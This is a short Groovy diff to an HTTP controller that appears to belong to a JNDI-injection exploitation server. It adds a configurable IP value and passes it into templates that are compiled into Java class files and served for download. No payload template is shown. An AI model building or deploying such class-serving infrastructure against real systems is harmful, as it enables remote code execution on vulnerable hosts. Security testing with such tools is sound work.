@@ -3,6 +3,7 @@ package com.jndi.controller
 import com.jndi.server.ClassServer
 import groovy.util.logging.Slf4j
 import org.springframework.beans.factory.annotation.Autowired
+import org.springframework.beans.factory.annotation.Value
 import org.springframework.http.*
 import org.springframework.web.bind.annotation.GetMapping
 import org.springframework.web.bind.annotation.PathVariable
@@ -11,6 +12,9 @@ import org.springframework.web.bind.annotation.RestController
 @Slf4j
 @RestController
 class HttpController {
+
+    @Value('${jndi.ip}')
+    String ip
 
     @Autowired
     ClassServer classServer
@@ -33,7 +37,8 @@ class HttpController {
         ContentDisposition contentDisposition = ContentDisposition.builder('attachment').filename(className + '.class').build()
         httpHeaders.setContentDisposition(contentDisposition)
         httpHeaders.setContentType(MediaType.APPLICATION_OCTET_STREAM)
-        new ResponseEntity<byte[]>(classServer.getClassBytesByTemplate(className + '.java.ftl'), httpHeaders, HttpStatus.OK)
+        def args = [ip: ip, result: 'hello']
+        new ResponseEntity<byte[]>(classServer.getClassBytesByTemplate(className + '.java.ftl', args), httpHeaders, HttpStatus.OK)
     }
 
 }
